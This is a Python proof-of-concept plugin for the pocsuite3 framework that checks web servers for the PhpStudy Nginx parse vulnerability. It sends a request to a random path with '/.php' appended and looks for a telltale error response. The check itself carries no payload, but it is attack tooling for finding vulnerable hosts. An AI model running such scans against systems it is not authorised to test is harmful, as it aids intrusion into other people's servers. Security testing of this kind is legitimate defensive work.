#!usr/bin/env python  
# -*- coding:utf-8 -*-

"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, logger, requests
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '3.0'
    author = ['']
    vulDate = '2020-9-3'
    createDate = '2020-9-3'
    updateDate = '2020-9-3'
    references = ['']
    name = 'PhpStudy Nginx Parse Vul'
    appPowerLink = ''
    appName = 'PhpStudy'
    appVersion = ''
    vulType = 'Parse Vul'
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def exploit(self, mode):
        result = {}

        rand_path = random_str()
        vul_url1 = urljoin(self.url, "/" + rand_path)
        vul_url2 = urljoin(self.url, "/" + rand_path + "/.php")

        resp1 = requests.get(vul_url1)
        resp2 = requests.get(vul_url2)
        if resp1.status_code == 404 and "No input file specified" in resp2.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return result

    def _verify(self):
        result = {}

        try:
            result = self.exploit(mode='verify')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
